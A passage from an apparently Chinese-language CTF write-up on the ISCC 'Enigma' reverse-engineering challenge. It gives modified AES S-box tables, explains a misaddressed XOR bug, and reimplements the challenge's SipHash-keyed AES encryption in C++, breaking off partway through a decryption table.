class="number">0xdc</span>, <span class="number">0xc9</span>, <span class="number">0x8f</span>, <span class="number">0xa4</span>, <span class="number">0xe3</span>, <span class="number">0xe7</span>, <span class="number">0x17</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>, <span class="number">0xca</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>, <span class="number">0xae</span>, <span class="number">0x83</span>, <span class="number">0x63</span>, <span class="number">0x82</span>, <span class="number">0x27</span>, <span class="number">0x4a</span>, <span class="number">0x21</span>, <span class="number">0x71</span>, <span class="number">0x2c</span>, <span class="number">0x57</span>, <span class="number">0x7d</span>, <span class="number">0xaf</span>, <span class="number">0x44</span>, <span class="number">0x85</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>, <span class="number">0xf4</span>, <span class="number">0xfd</span>, <span class="number">0x3c</span>, <span class="number">0xf1</span>, <span class="number">0x45</span>, <span class="number">0x1f</span>, <span class="number">0x5b</span>, <span class="number">0xb8</span>, <span class="number">0xa1</span>, <span class="number">0xc4</span>, <span class="number">0x79</span>, <span class="number">0x53</span>, <span class="number">0x09</span>, <span class="number">0xea</span>, <span class="number">0xee</span>, <span class="number">0x0c</span>, <span class="number">0xd6</span>, <span class="number">0x61</span>, <span class="number">0xc6</span>, <span class="number">0xaa</span>, <span class="number">0xb0</span>, <span class="number">0x69</span>, <span class="number">0x81</span>, <span class="number">0xb9</span>, <span class="number">0x7f</span>, <span class="number">0xec</span>, <span class="number">0x94</span>, <span class="number">0xce</span>, <span class="number">0xa9</span>, <span class="number">0x97</span>, <span class="number">0x3b</span>, <span class="number">0xda</span>, <span class="number">0x8e</span>, <span class="number">0xe5</span>, <span class="number">0x86</span>, <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0xad</span>, <span class="number">0xd1</span>, <span class="number">0xd7</span>, <span class="number">0x40</span>, <span class="number">0xb2</span>, <span class="number">0x65</span>, <span class="number">0xcb</span>, <span class="number">0xb7</span>, <span class="number">0x1c</span>, <span class="number">0x7a</span>, <span class="number">0xf6</span>, <span class="number">0x87</span>, <span class="number">0xcd</span>, <span class="number">0x4f</span>, <span class="number">0x9f</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x0f</span>, <span class="number">0x6a</span>, <span class="number">0xa8</span>, <span class="number">0xde</span>, <span class="number">0xc3</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0xfa</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x90</span>, <span class="number">0xdf</span>, <span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xe0</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xe2</span>, <span class="number">0x99</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x26</span>, <span class="number">0x6b</span>, <span class="number">0x0b</span>, <span class="number">0x3e</span>, <span class="number">0x1d</span>, <span class="number">0xe1</span>, <span class="number">0x58</span>, <span class="number">0x38</span>, <span class="number">0xc2</span>, <span class="number">0x78</span>, <span class="number">0x0e</span>, <span class="number">0x59</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x88</span>, <span class="number">0xdd</span>, <span class="number">0x9b</span>, <span class="number">0xd2</span>, <span class="number">0x19</span>, <span class="number">0x7e</span>, <span class="number">0xf9</span>, <span class="number">0xdb</span>, <span class="number">0xfe</span>, <span class="number">0x60</span>, <span class="number">0x13</span>, <span class="number">0x4c</span>, <span class="number">0xcc</span>, <span class="number">0xf3</span>, <span class="number">0xa5</span>, <span class="number">0x14</span>, <span class="number">0x34</span>, <span class="number">0x96</span>, <span class="number">0x80</span>, <span class="number">0xe6</span>, <span class="number">0x9a</span>, <span class="number">0xf5</span>, <span class="number">0x9e</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x0a</span>, <span class="number">0xcf</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x06</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[] = &#123; <span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>, <span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>, <span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>, <span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>, <span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>, <span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>, <span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>, <span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>, <span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>, <span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>, <span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/05/25/ISCC-Enigma/image-16.png" alt="alt text"></p><h2 id="错误代码部分"><a href="#错误代码部分" class="headerlink" title="错误代码部分"></a>错误代码部分</h2><p>function_8处代码本意是要将静态的明文xor上0x10，但是地址不对，xor到了一个空白的内存，所以解密的时候得把密文都xor 0x10，才能成功爆破出来密钥。</p><p><img src="/2025/05/25/ISCC-Enigma/image-17.png" alt="alt text"></p><h2 id="加密同构"><a href="#加密同构" class="headerlink" title="加密同构"></a>加密同构</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AES.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _le64toh(x) ((uint64_t)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTATE(x, b) (uint64_t)( ((x) <span class="string">&lt;&lt; (b)) | ( (x) &gt;</span>&gt; (64 - (b))) )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_ROUND(a,b,c,d,s,t)\</span></span><br><span class="line"><span class="meta">a += b; c += d;\</span></span><br><span class="line"><span class="meta">b = ROTATE(b, s) ^ a;\</span></span><br><span class="line"><span class="meta">d = ROTATE(d, t) ^ c;\</span></span><br><span class="line"><span class="meta">a = ROTATE(a, 32);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DOUBLE_ROUND(v0,v1,v2,v3)\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">siphash24</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* src, <span class="type">unsigned</span> <span class="type">long</span> src_sz, <span class="type">const</span> <span class="type">char</span> key[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* _key = (<span class="type">uint64_t</span>*)key;</span><br><span class="line"><span class="type">uint64_t</span> k0 = _le64toh(_key[<span class="number">0</span>]);</span><br><span class="line"><span class="type">uint64_t</span> k1 = _le64toh(_key[<span class="number">1</span>]);</span><br><span class="line"><span class="type">uint64_t</span> b = (<span class="type">uint64_t</span>)src_sz &lt;&lt; <span class="number">56</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* in = (<span class="type">uint64_t</span>*)src;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> v0 = k0 ^ <span class="number">0x102030405060708</span>;</span><br><span class="line"><span class="type">uint64_t</span> v1 = k1 ^ <span class="number">0x90a0b0c0d0e0f00</span>;</span><br><span class="line"><span class="type">uint64_t</span> v2 = k0 ^ k1 ^ <span class="number">0x123456789abcdef</span>;</span><br><span class="line"><span class="type">uint64_t</span> v3 = k1 ^ k0 ^ <span class="number">0x4953434343435349</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (src_sz &gt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="type">uint64_t</span> mi = _le64toh(*in);</span><br><span class="line">in += <span class="number">1</span>; src_sz -= <span class="number">8</span>;</span><br><span class="line">v3 ^= mi;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= mi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> t = <span class="number">0</span>; <span class="type">uint8_t</span>* pt = (<span class="type">uint8_t</span>*)&amp;t; <span class="type">uint8_t</span>* m = (<span class="type">uint8_t</span>*)in;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">6</span>] = m[<span class="number">6</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">5</span>] = m[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">4</span>] = m[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">uint32_t</span>*)&amp;pt[<span class="number">0</span>]) = *((<span class="type">uint32_t</span>*)&amp;m[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">2</span>] = m[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">1</span>] = m[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">0</span>] = m[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">b |= _le64toh(t);</span><br><span class="line"></span><br><span class="line">v3 ^= b;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= b; v2 ^= <span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="keyword">return</span> (v0 ^ v1) ^ (v2 ^ v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> lRam00000c68&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">my_rand</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lRam00000c68 = lRam00000c68 * <span class="number">0x5851f42d4c957f2d</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">uint32_t</span>)((<span class="type">uint64_t</span>)lRam00000c68 &gt;&gt; <span class="number">0x21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_srand</span><span class="params">(<span class="type">uint32_t</span> seed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lRam00000c68 = (<span class="type">uint64_t</span>)(seed - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 随机数生成列表</span></span><br><span class="line"><span class="built_in">my_srand</span>(<span class="number">1746373320</span>);</span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] += (<span class="type">uint8_t</span>)(<span class="built_in">my_rand</span>() % <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入48长度</span></span><br><span class="line"><span class="type">uint8_t</span> input[] = <span class="string">&quot;ISCC&#123;1234123544556ASDASeffgghhiijj12321312312kk&#125;&quot;</span>;</span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hash明文取input前八字节和最后一个字节</span></span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[<span class="number">9</span>]&#123;&#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(hash_plaintext, input, <span class="number">8</span>);</span><br><span class="line">hash_plaintext[<span class="number">8</span>] = <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spihash计算</span></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用hash生成Key</span></span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">aesEncrypt</span>(key, <span class="number">16</span>, input + i, out, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, out[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>AES魔改后解密代码：</p><p>代码基于：<a href="https://github.com/lmshao/AES">https://github.com/lmshao/AES</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[] = &#123; <span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>, <span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>, <span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>, <span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>, <span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>, <span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>, <span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span 